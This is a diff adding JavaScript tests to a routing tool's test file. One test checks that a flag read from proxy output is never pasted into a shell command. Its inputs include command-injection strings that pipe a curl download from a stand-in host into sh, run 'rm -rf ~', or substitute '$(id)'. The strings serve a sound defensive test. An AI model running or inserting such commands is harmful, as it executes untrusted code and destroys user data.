@@ -466,6 +466,52 @@ check("tool limits come from the proxy's requirement_limits, not the engine name
   assert.deepEqual(rerank.nodes.map((node) => node.label), ['studio'])
 })
 
+check('a flag that is not a plain long flag is never quoted into a command', () => {
+  // The proxy address is free text, so whatever answers there controls this
+  // field; the page invites the operator to paste what it builds from it.
+  for (const flag of [
+    '--allow-mixed-engines; curl -s https://x/p | sh #',
+    '--allow-mixed-engines && rm -rf ~',
+    '--allow-mixed-engines $(id)',
+    '--Allow',
+    '-a',
+    'allow-mixed-engines',
+    '--allow-mixed-engines\n',
+  ]) {
+    const placement = describePlacement({ mixed_engines: 'refused', flag })
+    assert.equal(placement.flag, null, JSON.stringify(flag))
+    assert.equal(routingCommand(placement, 'mixed'), null, JSON.stringify(flag))
+    assert.equal(routingCommand({ flag }, 'mixed'), null, `raw ${JSON.stringify(flag)}`)
+    assert.equal(routingCommand({ flag }, 'camelid_only'), null, `raw ${JSON.stringify(flag)}`)
+  }
+  assert.equal(routingCommand({ flag: '--allow-mixed-engines' }, 'mixed'), 'camelid fabric serve … --allow-mixed-engines')
+})
+
+check('a node that was not reached is carried with its state, so a missing version is not read as unpublished', () => {
+  const blockers = [{ key: 'warm_prefix', blocker: 'zz-b', consequence: 'zz-c' }]
+  const limits = [{ key: 'tool_calls', consequence: 'zz-t' }]
+  const reached = {
+    spec: { label: 'lm', host: 'h', port: 1, engine: 'zz-engine' },
+    status: { state: 'ready', engine: 'zz-engine', models: ['m'] },
+    placement_blocker_detail: blockers,
+    requirement_limits: limits,
+  }
+  const unreached = {
+    spec: { label: 'down', host: 'h', port: 2, engine: 'zz-engine' },
+    status: { state: 'unreachable', reason: 'connection refused', version: 'zz-stale' },
+    placement_blocker_detail: blockers,
+    requirement_limits: limits,
+  }
+  const nodes = describeFabric(answered(fabricBody({ nodes: [reached, unreached] }))).nodes
+  const accepted = mixedModeAcceptance(nodes)[0].nodes
+  assert.deepEqual(accepted.map((node) => [node.label, node.state, node.version]), [
+    ['lm', 'ready', null],
+    ['down', 'unreachable', null],
+  ])
+  const limited = requirementLimits(nodes)[0].nodes
+  assert.deepEqual(limited.map((node) => [node.label, node.state]), [['lm', 'ready'], ['down', 'unreachable']])
+})
+
 check('the command uses the flag the proxy published', () => {
   const placement = describePlacement({ mixed_engines: 'refused', flag: '--zz-flag' })
   const mixed = routingCommand(placement, 'mixed')
